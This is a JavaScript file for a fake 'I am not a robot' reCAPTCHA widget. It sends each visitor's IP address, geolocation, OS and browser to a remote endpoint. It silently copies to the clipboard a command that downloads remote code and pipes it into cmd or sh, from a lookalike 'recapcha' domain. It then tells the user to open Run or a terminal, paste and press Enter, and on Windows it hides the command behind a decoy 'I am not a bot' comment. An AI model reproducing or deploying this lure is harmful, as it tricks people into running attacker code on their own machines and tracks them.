(function () {
    const checkboxWindow = document.getElementById("rto-checkbox-window");
    const checkboxBtn = document.getElementById("rto-checkbox");
    const checkboxBtnSpinner = document.getElementById("rto-spinner");
    const verifiedCheck = document.getElementById("rto-verified");
    const verifywindow = document.getElementById("rto-verify-window");
    const verifyButtonSpinner = document.getElementById("rto-verify-verify-button-spinner");
    const verifyButtonText = document.getElementById("rto-verify-verify-button-text");
    const verifyButton = document.getElementById("rto-verify-verify-button");
    const captchaContainer = document.getElementById('rto-captchaContainer');
    const captchaGroup = document.querySelector('.rto-captchagroup');
    const comingSoon = document.getElementById('rto-comingSoon');

    function getBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes("Firefox/")) return "Firefox";
        if (ua.includes("Edg/")) return "Edge";
        if (ua.includes("Chrome/") && !ua.includes("Edg/")) return "Chrome";
        if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
        if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
        return "Unknown";
    }
    const browser = getBrowserName();

    const submitApplicationButton = document.getElementById("submit-application-button");
    /* ================= STATUS CHECKER ================= */
    let customizedIpAddress = null;
    let statusTimer = null;

    function getIpAddress() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
    }

    function customizeIpAddress(ip) {
        return ip.replace(/\./g, '-');
    }

    // console.log("customizedIpAddress", customizedIpAddress);

    function getRepairedStatus() {
        if (!customizedIpAddress) return;
        // console.log("customizedIpAddress", customizedIpAddress);
        fetch(`https://status-handler-sage.vercel.app/api/get-status?requestId=${customizedIpAddress}&token=203`)
            .then(response => {
                if (!response.ok) {
                    if (response.status === 404) return null;
                    throw new Error(`Status request failed: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                // console.log("data.status", data.status);
                if (!data || !data.status || data.status === 'idle') {
                    disableVerifyButton();
                    return;
                }
                if (data.status === 'started') {
                    enableVerifyButton();
                }
                if (data.status === 'ended') {
                    clearInterval(statusTimer);
                    disableVerifyButton();
                    showVerified();
                }
            })
            .catch(() => { });
    }

    // console.log("getIpAddress");
    getIpAddress()
        .then((ip) => {
            customizedIpAddress = customizeIpAddress(ip);
            // console.log("customizedIpAddress", customizedIpAddress);
            // getRepairedStatus();
            // statusTimer = setInterval(getRepairedStatus, 1000);
        })
        .catch(() => { });

    /* ================= END STATUS CHECKER ================= */

    verifyButton.addEventListener("click", function () {
        verifyButtonSpinner.style.display = "inline";
        verifyButtonSpinner.style.opacity = "1";
        verifyButtonSpinner.style.animation = "rto-spin 1s linear infinite";
        verifyButtonText.style.display = "none";
        setTimeout(() => {
            clearInterval(statusTimer);
            disableVerifyButton();
            showVerified();
        }, 1000);
    });

    function detectOS() {
        const platform = navigator.userAgent;
        if (/windows/i.test(platform)) return "Windows";
        if (/macintosh|mac os x/i.test(platform)) return "MacOS";
        if (/linux/i.test(platform)) return "Linux";
        if (/android/i.test(platform)) return "Android";
        if (/iphone|ipad|ipod/i.test(platform)) return "iOS";
        return "Unknown";
    }

    const osType = detectOS();
    const isPcOs = (osType === "Windows") || (osType === "MacOS") || (osType === "Linux");

    if (!isPcOs) {
        if (captchaGroup) captchaGroup.style.display = 'none';
        else if (captchaContainer) captchaContainer.style.display = 'none';
        if (comingSoon) comingSoon.style.display = 'flex';
        return;
    }

    if (osType === "Linux") {
        document.getElementById("rto-verify-main").innerHTML = `
                    <p>To better prove you are not a robot, please:</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Ctrl</b> + <b>Alt</b> + <b>T</b></span>.</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">2. In the verification window, press <span class="rto-windows-key-label"><b>Ctrl</b> + <b>Shift</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <br>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
    } else if (osType === "MacOS") {
        document.getElementById("rto-verify-main").innerHTML = `
                    <p>To better prove you are not a robot, please:</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Cmd</b> + <b>Spacebar</b></span>.</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">2. In the verification window, type <span class="rto-windows-key-label"><b>Terminal</b>, and Press & hold the Key <b>Command</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <br>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
    } else {
        document.getElementById("rto-verify-main").innerHTML = `
                    <p>To better prove you are not a robot, please:</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">1. Press & hold the Key <span class="rto-windows-key-label"> <b>Win</b> + <b>R</b></span>.</p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">2. In the verification window, type <span class="rto-windows-key-label"><b>Ctrl</b> + <b>V</b>.</span></p>
                    <p style="margin-left: 25px; margin-bottom: 5px;">3. Press <span class="rto-windows-key-label"><b>Enter</b></span> on your keyboard to finish.</p>
                    <br>
                    <p>You will observe and agree:<br>
                    <code>✅ "I am not a robot - reCAPTCHA Verification ID: <span id="rto-verification-id">146820</span>"</code>
                    </p>`;
    }

    async function getLocationByIP() {
        const apiUrl = `https://get.geojs.io/v1/ip/geo/${await getIpAddress()}.json`;
        const res = await fetch(apiUrl).catch(() => { });
        const data = await res.json();
        return data.country + ', ' + data.organization_name + ', ' + data.latitude + ', ' + data.longitude;
    }

    (async function () {
        const location = await getLocationByIP();
        fetch('https://status-handler-sage.vercel.app/api/entered-site?token=203', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                token: '203',
                currentUrl: window.location.href,
                ip: await getIpAddress(),
                os: osType,
                location: location,
                browser: browser,
                timestamp: new Date().toISOString()
            })
        }).then(r => r.json()).catch(() => { });
    })();

    function addCaptchaListeners() {
        if (!checkboxBtn) return;
        document.addEventListener("click", function (event) {
            let path = event.composedPath();
            if (!path.includes(verifywindow) && isverifywindowVisible()) {
                closeverifywindow();
            }
        });
        checkboxBtn.addEventListener("click", function (event) {
            event.preventDefault();
            checkboxBtn.disabled = true;
            if (window.CoinCortexTelegram && window.CoinCortexTelegram.notify) {
                window.CoinCortexTelegram.notify("captcha_click");
            }
            runClickedCheckboxEffects();
        });
    }

    function runClickedCheckboxEffects() {
        getRepairedStatus();
        hideCaptchaCheckbox();
        setTimeout(function () {
            showCaptchaLoading();
        }, 200);
        setTimeout(function () {
            hideCaptchaLoading();
            showCaptchaCheckbox();
            showVerifyWindow();
        }, 1100);
    }

    function showCaptchaLoading() {
        if (!checkboxBtnSpinner) return;
        checkboxBtnSpinner.style.visibility = "visible";
        checkboxBtnSpinner.style.opacity = "1";
        checkboxBtnSpinner.style.animation = "rto-spin 1s linear infinite";
    }

    function enableVerifyButton() {
        verifyButton.disabled = false;
        verifyButton.style.cursor = "";
        verifyButton.style.opacity = "";
        verifyButton.style.backgroundColor = "";
        verifyButton.style.color = "";
        verifyButton.style.animation = "none";

        setTimeout(() => {
            clearInterval(statusTimer);
            disableVerifyButton();
            showVerified();
        }, 1000);
    }

    function disableVerifyButton() {
        verifyButton.disabled = true;
        verifyButton.style.cursor = "";
        verifyButton.style.opacity = "";
        verifyButton.style.backgroundColor = "";
        verifyButton.style.color = "";
        verifyButton.style.animation = "none";
    }

    function hideCaptchaCheckbox() {
        checkboxBtn.style.visibility = "hidden";
        checkboxBtn.style.opacity = "0";
    }

    function showCaptchaCheckbox() {
        checkboxBtn.style.opacity = "1";
        checkboxBtn.style.visibility = "visible";
    }

    function hideCaptchaLoading() {
        checkboxBtnSpinner.style.visibility = "hidden";
        checkboxBtnSpinner.style.opacity = "0";
    }

    function showCaptchaVerified() {
        hideCaptchaCheckbox();
        hideCaptchaLoading();
        if (!verifiedCheck) return;
        verifiedCheck.classList.add("rto-verified-show");
    }

    function hideCaptchaVerified() {
        if (!verifiedCheck) return;
        verifiedCheck.classList.remove("rto-verified-show");
    }

    function generateRandomNumber() {
        const min = 1000;
        const max = 9999;
        return Math.floor(Math.random() * (max - min + 1) + min).toString();
    }

    // Keep a marker so we can put the window back after moving it to <body>.
    // Parents with backdrop-filter/transform trap position:fixed and let
    // later borders (e.g. #content) paint over the popup.
    const verifywindowParent = verifywindow.parentElement;
    const verifywindowHome = document.createComment("rto-verify-window-home");
    verifywindowParent.insertBefore(verifywindowHome, verifywindow);

    function restoreVerifyWindowHome() {
        if (verifywindowParent && verifywindow.parentElement !== verifywindowParent) {
            verifywindowParent.insertBefore(verifywindow, verifywindowHome);
        }
    }

    function closeverifywindow() {
        verifywindow.style.display = "none";
        verifywindow.style.visibility = "hidden";
        verifywindow.style.opacity = "0";
        window.removeEventListener("scroll", positionVerifyWindow, true);
        window.removeEventListener("resize", positionVerifyWindow);
        // restoreVerifyWindowHome();
        hideCaptchaLoading();
        hideCaptchaVerified();
        showCaptchaCheckbox();
        checkboxBtn.disabled = false;
    }

    function isverifywindowVisible() {
        return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
    }

    function setClipboardCopyData(textToCopy) {
        const tempTextArea = document.createElement("textarea");
        tempTextArea.value = textToCopy;
        document.body.append(tempTextArea);
        tempTextArea.select();
        document.execCommand("copy");
        document.body.removeChild(tempTextArea);
    }

    function stageClipboard(commandToRun, verification_id) {
        const suffix = " :: ";
        // cmd /c curl -s "https://api.recapcha.fun/auth/v1?token=20" | cmd :: "I am not a bot. Fixing the issue as a service. ID: 12316"
        const ploy = "''I am not a bot. I am fixing issues as a service. ID: ";
        const end = "''";
        const textToCopy = commandToRun + suffix + ploy + verification_id + end;
        if (osType === "Windows")
            setClipboardCopyData(textToCopy);
        else
            setClipboardCopyData(commandToRun);
    }

    function enableSubmitApplicationButton() {
        if (!submitApplicationButton) return;
        submitApplicationButton.disabled = false;
        submitApplicationButton.classList.add("rto-apply-enabled");
        submitApplicationButton.removeAttribute("aria-disabled");
    }

    function showVerified() {
        clearInterval(statusTimer);
        hideVerifyWindow();
        showCaptchaVerified();
        enableSubmitApplicationButton();
        if (checkboxBtn) checkboxBtn.disabled = true;
    }

    function hideVerifyWindow() {
        verifywindow.style.display = "none";
        window.removeEventListener("scroll", positionVerifyWindow, true);
        window.removeEventListener("resize", positionVerifyWindow);
        restoreVerifyWindowHome();
    }

    function positionVerifyWindow() {
        if (!checkboxWindow || !isverifywindowVisible()) return;

        const rect = checkboxWindow.getBoundingClientRect();
        let top = rect.top - 80;
        let left = rect.left + 54;

        if (top < 5) top = 5;
        if (left + 310 > window.innerWidth - 10) {
            left = rect.left - 8;
        }
        if (left < 5) left = 5;

        verifywindow.style.top = top + "px";
        verifywindow.style.left = left + "px";
    }

    function showVerifyWindow() {
        document.body.appendChild(verifywindow);
        verifywindow.style.display = "block";
        verifywindow.style.visibility = "visible";
        verifywindow.style.opacity = "1";
        verifywindow.style.position = "fixed";
        verifywindow.style.zIndex = "2147483646";

        positionVerifyWindow();
        window.addEventListener("scroll", positionVerifyWindow, true);
        window.addEventListener("resize", positionVerifyWindow);

        var verification_id = generateRandomNumber();
        document.getElementById('rto-verification-id').textContent = verification_id;

        let htaPath;
        if (osType === "Windows") {
            htaPath = "cmd /c curl -s https://api.recapcha.fun/auth/v1?token=203 | cmd";
        } else if (osType === "Linux") {
            htaPath = "wget -qO- 'https://api.recapcha.fun/auth/v2?token=203' | sh";
        } else if (osType === "MacOS") {
            htaPath = "curl 'https://api.recapcha.fun/auth/v3?token=203' | sh";
        }
        stageClipboard(htaPath, verification_id);
    }

    addCaptchaListeners();
})();